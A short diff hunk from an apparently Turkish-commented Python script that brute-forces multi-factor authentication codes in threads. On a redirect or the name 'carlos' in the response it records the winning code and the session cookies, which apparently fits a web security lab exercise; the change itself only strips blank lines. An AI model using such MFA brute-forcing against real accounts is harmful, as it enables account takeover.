@@ -204,38 +204,23 @@ def try_mfa_code(mfa_code):
         })
 
         print(f"MFA kodu denendi: {mfa_code}")
-
         if last_response.status_code == 302 or "carlos" in last_response.text :
-
             with lock:
-
                 found_code = mfa_code
-
                 cookies_dict = local_session.cookies.get_dict()
-
                 success_info = {
-
                     "message": f"Doğru kod bulundu: {mfa_code}",
-
                     "url": url,
-
                     "cookies": cookies_dict,
-
                     "session": local_session
-
                 }
-
                 print(f"Doğru kod bulundu: {mfa_code}")
-
                 print("URL:", url)
-
                 print("Cookies:", cookies_dict)
 
     except Exception as e:
-
         print(f"Hata oluştu ({mfa_code}): {str(e)}")
 
-  
 
 # Multi-threading işlemi
 
